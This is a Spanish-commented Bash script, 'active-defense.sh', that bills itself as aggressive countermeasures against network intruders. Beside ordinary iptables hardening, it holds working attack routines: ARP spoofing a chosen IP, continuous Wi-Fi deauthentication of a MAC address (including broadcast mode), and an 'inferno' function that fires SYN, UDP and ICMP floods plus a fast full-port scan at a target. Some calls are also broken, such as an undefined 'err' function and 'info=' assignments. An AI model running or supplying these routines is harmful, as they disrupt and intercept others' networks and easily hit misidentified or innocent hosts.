#!/bin/bash
# ============================================================
# active-defense.sh - Contramedidas Activas de Red
# Respuesta agresiva contra intrusos en tu propia red
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

LOG_DIR="/var/log/active-defense"
ACTION_LOG="$LOG_DIR/actions.log"

mkdir -p "$LOG_DIR"

log() { echo -e "${GREEN}[✓]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
alert() { echo -e "${RED}[!!!]${NC} $1"; }
info() { echo -e "${BLUE}[i]${NC} $1"; }

[[ $EUID -ne 0 ]] && { echo -e "${RED}Ejecutar como root${NC}"; exit 1; }

# ============================================================
# 1. ARP SPOOFING OFENSIVO (Cortar conexión del atacante)
# ============================================================
arp_cutoff() {
    local target_ip="$1"
    local gateway_ip="${2:-$(ip route | grep default | awk '{print $3}')}"
    local interface="${3:-eth0}"
    
    if [ -z "$target_ip" ]; then
        err "Uso: $0 arp-cut <IP_atacante> [IP_gateway] [interfaz]"
        return 1
    fi
    
    echo -e "\n${RED}=== ARP SPOOFING OFENSIVO ===${NC}"
    alert "Cortando conexión de $target_ip"
    echo ""
    
    # Verificar que dsniff/arpspoof esté instalado
    if ! command -v arpspoof &> /dev/null; then
        warn "Instalando dsniff..."
        apt-get install -y dsniff 2>/dev/null
    fi
    
    info "Gateway: $gateway_ip"
    info "Target: $target_ip"
    info "Interfaz: $interface"
    echo ""
    
    # Habilitar forwarding (necesario para arpspoof)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Ejecutar arpspoof en background
    info "Iniciando ARP spoofing contra $target_ip..."
    arpspoof -i "$interface" -t "$target_ip" "$gateway_ip" &
    ARPSPOOF_PID=$!
    
    echo "$ARPSPOOF_PID" > /tmp/active-defense-arpspoof.pid
    
    log "ARP spoofing activo - PID: $ARPSPOOF_PID"
    log "Para detener: kill $ARPSPOOF_PID"
    
    echo "$(date) ARP_CUT started against $target_ip" >> "$ACTION_LOG"
}

# ============================================================
# 2. TARPIT (Congelar escáner del atacante)
# ============================================================
tarpit_attacker() {
    local target_ip="$1"
    
    if [ -z "$target_ip" ]; then
        err "Uso: $0 tarpit <IP_atacante>"
        return 1
    fi
    
    echo -e "\n${RED}=== TARPIT - CONGELANDO ATACANTE ===${NC}"
    alert "Aplicando TARPIT a $target_ip"
    echo ""
    
    # Verificar si xtables-addons está disponible
    if ! iptables -m TARPIT -j TARPIT 2>/dev/null; then
        warn "Módulo TARPIT no disponible"
        info "Intentando método alternativo con nfqueue..."
        
        # Método alternativo: usar iptables con REJECT lento
        iptables -A INPUT -s "$target_ip" -p tcp --dport 1:65535 -j REJECT --reject-with tcp-reset
        iptables -A INPUT -s "$target_ip" -p udp --dport 1:65535 -j DROP
        
        log "Aplicado REJECT lento a $target_ip"
    else
        # Usar TARPIT real si está disponible
        iptables -A INPUT -s "$target_ip" -p tcp -j TARPIT
        log "TARPIT aplicado a $target_ip"
    fi
    
    echo "$(date) TARPIT applied to $target_ip" >> "$ACTION_LOG"
}

# ============================================================
# 3. FLOOD ARP LEGITIMO (Contrarrestar ARP spoofing)
# ============================================================
arp_flood_defense() {
    local gateway_ip="${1:-$(ip route | grep default | awk '{print $3}')}"
    local interface="${2:-eth0}"
    local local_ip=$(ip addr show "$interface" | grep -oP 'inet \K[0-9./]+' | head -1 | cut -d'/' -f1)
    local local_mac=$(ip link show "$interface" | grep ether | awk '{print $2}')
    
    echo -e "\n${RED}=== FLOOD ARP LEGITIMO ===${NC}"
    alert "Enviando ARP gratuitous para proteger identidad"
    echo ""
    
    info="Tu IP: $local_ip"
    info="Tu MAC: $local_mac"
    info="Gateway: $gateway_ip"
    echo ""
    
    # Enviar ARP gratuitous cada 100ms por 30 segundos
    info "Enviando ARP legítimos por 30 segundos..."
    
    for i in $(seq 1 300); do
        arping -U -I "$interface" -c 1 -s "$local_ip" "$gateway_ip" 2>/dev/null || true
        sleep 0.1
    done
    
    log "Flood ARP completado - Identidad real reforzada"
    echo "$(date) ARP_FLOOD defense completed" >> "$ACTION_LOG"
}

# ============================================================
# 4. BLACKHOLE (Agujero negro total)
# ============================================================
blackhole_attacker() {
    local target_ip="$1"
    
    if [ -z "$target_ip" ]; then
        err "Uso: $0 blackhole <IP_atacante>"
        return 1
    fi
    
    echo -e "\n${RED}=== BLACKHOLE - AGUJERO NEGRO ===${NC}"
    alert "Creando blackhole para $target_ip"
    echo ""
    
    # Redirigir todo el tráfico del atacante a null0
    ip route add black "$target_ip" 2>/dev/null || true
    
    # Regla iptables para blacklist completo
    iptables -A INPUT -s "$target_ip" -j DROP
    iptables -A OUTPUT -d "$target_ip" -j DROP
    iptables -A FORWARD -s "$target_ip" -j DROP
    iptables -A FORWARD -d "$target_ip" -j DROP
    
    log "Blackhole configurado para $target_ip"
    log "El atacante no recibirá ninguna respuesta"
    
    echo "$(date) BLACKHOLE created for $target_ip" >> "$ACTION_LOG"
}

# ============================================================
# 5. DESAUTENTICACIÓN Wi-Fi
# ============================================================
wifi_deauth() {
    local target_mac="$1"
    local ap_mac="${2:-}"
    local interface="${3:-wlan0mon}"
    
    if [ -z "$target_mac" ]; then
        err "Uso: $0 wifi-deauth <MAC_atacante> [MAC_AP] [interfaz_monitor]"
        return 1
    fi
    
    echo -e "\n${RED}=== DESAUTENTICACIÓN Wi-Fi ===${NC}"
    alert "Desautenticando a $target_mac"
    echo ""
    
    # Verificar que airmon-ng esté disponible
    if ! command -v aireplay-ng &> /dev/null; then
        warn "Instalando aircrack-ng..."
        apt-get install -y aircrack-ng 2>/dev/null
    fi
    
    # Verificar modo monitor
    if ! ip link show "$interface" &> /dev/null; then
        warn "Interfaz $interface no encontrada"
        info "Activando modo monitor..."
        airmon-ng check kill 2>/dev/null || true
        ip link set "$interface" up 2>/dev/null || {
            # Intentar con wlan0
            interface="wlan0"
            airmon-ng start "$interface" 2>/dev/null || true
        }
    fi
    
    if [ -z "$ap_mac" ]; then
        # Modo broadcast - desautenticar de todos los APs
        info "Enviando deauth broadcast..."
        aireplay-ng --deauth 0 -a "$target_mac" "$interface" &
    else
        # Modo específico
        info "Enviando deauth específico a AP $ap_mac..."
        aireplay-ng --deauth 0 -a "$ap_mac" -c "$target_mac" "$interface" &
    fi
    
    DEAUTH_PID=$!
    echo "$DEAUTH_PID" > /tmp/active-defense-deauth.pid
    
    log "Desautenticación activa - PID: $DEAUTH_PID"
    log "Para detener: kill $DEAUTH_PID"
    
    echo "$(date) WIFI_DEAUTH started against $target_mac" >> "$ACTION_LOG"
}

# ============================================================
# 6. INFERNO (Bombardeo de paquetes)
# ============================================================
inferno_attack() {
    local target_ip="$1"
    
    if [ -z "$target_ip" ]; then
        err "Uso: $0 inferno <IP_atacante>"
        return 1
    fi
    
    echo -e "\n${RED}=== INFERNO - BOMBARDEO DE PAQUETES ===${NC}"
    alert "Liberando infierno sobre $target_ip"
    echo ""
    
    # Múltiples vectores de ataque
    info "Iniciando bombardeo multinivel..."
    
    # 1. SYN flood controlado (rate limit para no colapsar tu máquina)
    hping3 -S -p 80 --flood -c 1000 "$target_ip" &
    
    # 2. UDP flood a puertos comunes
    hping3 --udp -p 53 --flood -c 500 "$target_ip" &
    
    # 3. ICMP flood
    hping3 --icmp --flood -c 500 "$target_ip" &
    
    # 4. Escaneo de todos los puertos (consuming sus recursos)
    nmap -p- -T5 --min-rate 1000 "$target_ip" &
    
    INFERNO_PIDS=$(jobs -p)
    echo "$INFERNO_PIDS" > /tmp/active-defense-inferno.pid
    
    log "Inferno activo - PIDs: $INFERNO_PIDS"
    log "Para detener: kill $(cat /tmp/active-defense-inferno.pid)"
    
    echo "$(date) INFERNO attack started against $target_ip" >> "$ACTION_LOG"
}

# ============================================================
# 7. MODO FANTASMA (Ocultamiento total)
# ============================================================
ghost_mode() {
    echo -e "\n${CYAN}=== MODO FANTASMA - OCULTAMIENTO TOTAL ===${NC}"
    info="Activando invisibilidad en la red"
    echo ""
    
    # 1. Deshabilitar respuestas ICMP
    info "1. Deshabilitando respuestas ICMP..."
    sysctl -w net.ipv4.icmp_echo_ignore_all=1
    sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
    sysctl -w net.ipv4.icmp_ignore_bogus_error_responses=1
    
    # 2. Política DROP agresiva
    info "2. Configurando política DROP..."
    iptables -P INPUT DROP
    iptables -P FORWARD DROP
    iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
    iptables -A INPUT -i lo -j ACCEPT
    
    # 3. Rate limit ICMP (si queremos algunas respuestas)
    info "3. Configurando rate limit ICMP..."
    iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 4 -j ACCEPT
    iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
    
    # 4. Bloquear escaneos
    info "4. Bloqueando técnicas de escaneo..."
    iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
    iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
    iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
    iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
    iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
    iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
    
    # 5. Hashlimit para prevenir brute force
    info "5. Configurando hashlimit..."
    iptables -A INPUT -p tcp --dport 22 -m hashlimit --hashlimit-above 5/min --hashlimit-burst 10 --hashlimit-mode srcip --hashlimit-name ssh -j DROP
    
    log "Modo fantasma activado"
    log "Tu máquina es ahora invisible en la red"
    
    echo "$(date) GHOST_MODE activated" >> "$ACTION_LOG"
}

# ============================================================
# 8. DETENER TODAS LAS CONTRAMEDIDAS
# ============================================================
stop_all() {
    echo -e "\n${GREEN}=== DETENIENDO TODAS LAS CONTRAMEDIDAS ===${NC}"
    
    # Detener arpspoof
    if [ -f /tmp/active-defense-arpspoof.pid ]; then
        kill $(cat /tmp/active-defense-arpspoof.pid) 2>/dev/null || true
        rm -f /tmp/active-defense-arpspoof.pid
        log "ARP spoofing detenido"
    fi
    
    # Detener deauth
    if [ -f /tmp/active-defense-deauth.pid ]; then
        kill $(cat /tmp/active-defense-deauth.pid) 2>/dev/null || true
        rm -f /tmp/active-defense-deauth.pid
        log "Desautenticación detenida"
    fi
    
    # Detener inferno
    if [ -f /tmp/active-defense-inferno.pid ]; then
        kill $(cat /tmp/active-defense-inferno.pid) 2>/dev/null || true
        rm -f /tmp/active-defense-inferno.pid
        log "Inferno detenido"
    fi
    
    # Limpiar reglas iptables
    info "Limpiando reglas iptables..."
    iptables -F
    iptables -X
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    
    # Restablecer ICMP
    sysctl -w net.ipv4.icmp_echo_ignore_all=0
    
    # Deshabilitar forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Eliminar rutas blackhole
    ip route flush cache 2>/dev/null || true
    
    log "Todas las contramedidas detenidas"
    echo "$(date) ALL COUNTERMEASURES STOPPED" >> "$ACTION_LOG"
}

# ============================================================
# 9. LISTAR CONTRAMEDIDAS ACTIVAS
# ============================================================
list_active() {
    echo -e "\n${CYAN}=== CONTRAMEDIDAS ACTIVAS ===${NC}"
    
    echo -e "\n${YELLOW}Procesos de defensa:${NC}"
    ps aux | grep -E "arpspoof|aireplay|hping3" | grep -v grep || echo "Ninguno activo"
    
    echo -e "\n${YELLOW}Reglas iptables:${NC}"
    iptables -L -n --line-numbers | head -30
    
    echo -e "\n${YELLOW}Estado ICMP:${NC}"
    sysctl net.ipv4.icmp_echo_ignore_all
    
    echo -e "\n${YELLOW}Rutas blackhole:${NC}"
    ip route show | grep black || echo "Ninguna"
}

# ============================================================
# MAIN
# ============================================================
echo -e "${CYAN}"
echo "╔═══════════════════════════════════════════════════════╗"
echo "║   ACTIVE DEFENSE - Contramedidas de Red              ║"
echo "║   Respuesta agresiva contra intrusos                 ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

case "${1:-help}" in
    arp-cut)
        arp_cutoff "$2" "$3" "$4"
        ;;
    tarpit)
        tarpit_attacker "$2"
        ;;
    arp-flood)
        arp_flood_defense "$2" "$3"
        ;;
    blackhole)
        blackhole_attacker "$2"
        ;;
    wifi-deauth)
        wifi_deauth "$2" "$3" "$4"
        ;;
    inferno)
        inferno_attack "$2"
        ;;
    ghost)
        ghost_mode
        ;;
    stop)
        stop_all
        ;;
    status)
        list_active
        ;;
    help|*)
        echo "Uso: $0 [comando] [opciones]"
        echo ""
        echo "CONTRAMEDIDAS OFENSIVAS:"
        echo "  arp-cut <IP>         - Cortar conexión vía ARP spoofing"
        echo "  tarpit <IP>          - Congelar escáner del atacante"
        echo "  arp-flood            - Reforzar identidad con ARP flood"
        echo "  blackhole <IP>       - Crear agujero negro total"
        echo "  wifi-deauth <MAC>    - Desautenticar del Wi-Fi"
        echo "  inferno <IP>         - Bombardeo de paquetes"
        echo ""
        echo "DEFENSA PASIVA:"
        echo "  ghost                - Modo fantasma (invisibilidad)"
        echo "  stop                 - Detener todas las contramedidas"
        echo "  status               - Ver contramedidas activas"
        ;;
esac
